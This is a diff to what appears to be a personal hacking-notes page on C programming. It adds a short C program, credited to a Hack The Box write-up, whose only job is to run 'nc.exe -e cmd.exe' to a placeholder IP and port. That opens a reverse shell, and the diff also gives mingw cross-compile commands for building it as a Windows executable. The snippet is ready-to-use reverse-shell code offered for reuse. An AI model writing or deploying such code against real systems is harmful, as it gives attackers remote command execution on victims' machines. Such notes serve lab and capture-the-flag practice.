@@ -45,6 +45,22 @@ signal(SIGTERM, handler);
 ```
 
 
+Simple use system to call another binary - see [[Compiling-Exploits]]
+```c
+#include "stdlib.h"
+//#include "stdafx.h" speeds up compile time
+// i686-w64-mingw32-gcc shell.c -o shell.exe
+// x86_64-w64-mingw32 shell.c -o shell.exe
+
+// Originally from https://snowscan.io/htb-writeup-giddy/#
+// But you could replace the system call with anything
+int main()
+{
+    system("nc.exe -e cmd.exe 10.10.10.10 4444");
+    return 0;
+}
+```
+
 [GCC](https://linux.die.net/man/1/gcc)
 [XinYminutesC](https://learnxinyminutes.com/docs/c/)
 [Jacob Sorber Programming with Processes](https://www.youtube.com/playlist?list=PL9IEJIKnBJjFNNfpY6fHjVzAwtgRYjhPw)
